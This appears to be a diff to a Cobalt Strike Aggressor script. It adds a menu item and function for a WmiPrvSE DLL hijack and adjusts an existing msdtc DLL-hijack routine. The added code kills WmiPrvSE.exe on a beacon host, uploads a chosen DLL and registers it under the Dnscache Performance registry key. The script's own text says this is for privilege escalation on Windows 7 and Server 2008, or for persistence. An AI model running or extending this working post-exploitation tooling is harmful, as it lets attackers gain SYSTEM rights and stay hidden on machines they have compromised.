@@ -98,7 +98,7 @@ sub msdtc_config{
 	foreach $id ($bid){
 		if(-isadmin $id){
 			btask($id, "配置msdtc dll劫持");
-			bshell($id, "taskkill /F /IM msdtc.exe");
+			bshell($id, "sc stop msdtc");
 			bshell($id, "del C:\\Windows\\System32\\oci.dll /F");
 			bupload($id, $dll);
 			bmv($id, $dllname, $dllname_w);
@@ -146,6 +146,12 @@ popup beacon_bottom{
 
 		}
 
+
+		item "&WmiPrvSE劫持"{
+			show_message("WmiPrvSE提权机会只有一次，失败就没了。一般系统运行只有一个WmiPrvSE.exe进程，当有超过一个WmiPrvSE.exe进程存在时。无法提权");
+			WmiPrvSE_config($bid);
+		}
+
 	}
 
 }
@@ -190,6 +196,46 @@ sub netsh_poort{
 	dbutton_action($dialog, "run");
 	dialog_show($dialog);
 
+}
+
+sub WmiPrvSE{
+	$dllname = $3['dll'];
+	$dllend = split("\\\\", $3['dll'])[-1];
+#	println($dllend);
+	$uploadpath = $3['uploadpath']."\\".$dllend;
+#	println($uploadpath);
+	$ps = 	bps($bid, lambda({
+		println($data);
+	}, $callback => $data));
+	foreach $id ($bid){
+		btask($id, "WmiPrvSE DLL劫持开始配置");
+		if(-isadmin $id){
+			btask($id, "当前为管理员权限，杀掉WmiPrvSE.exe进程");
+			bshell($id, "taskkill /F /IM WmiPrvSE.exe");
+		#	btask($id, "重新启动WmiPrvSE.exe进程");
+		#	bshell($id, "WmiPrvSE.exe");
+		}
+		bupload($id, $dllname);
+		bmv($id, $dllend, $uploadpath);
+		bshell($id, "reg delete HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Dnscache\\Performance /F");
+		bshell($id, "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Dnscache\\Performance /F");
+		bshell($id, "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Dnscache\\Performance /v Close /t REG_SZ /d ClosePerfData /F");
+		bshell($id, "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Dnscache\\Performance /v Collect /t REG_SZ /d CollectPerfData /F");
+		bshell($id, "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Dnscache\\Performance /v Library /t REG_SZ /d ".$uploadpath." /F");
+		bshell($id, "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Dnscache\\Performance /v Open /t REG_SZ /d OpenData /F");
+		bshell($id, "powershell -c \"Get-WmiObject -List | Where-Object {\$_.Name -Like \"\"Win32_Perf*\"\"\"\"}\"");
+	}
+	
+
+}
+
+sub WmiPrvSE_config{
+	$dialog = dialog("WmiPrvSE_config",%(uploadpath => "C:\\Windows\\Temp"), &WmiPrvSE);
+	dialog_description($dialog, "WmiPrvSE劫持\n提权适用于:Windows Server 2008\nWindows 7\n或更低版本\n或者用于做权限维持");
+	drow_file($dialog, "dll", "dll:");
+	drow_text($dialog, "uploadpath", "upload_path:");
+	dbutton_action($dialog, "run");
+	dialog_show($dialog);
 }
 
 
@@ -248,6 +294,7 @@ popup beacon_bottom{
 				$set = "delete";
 				netsh_poort($bid, $set);
 			}
+
 		}
 	}
 }
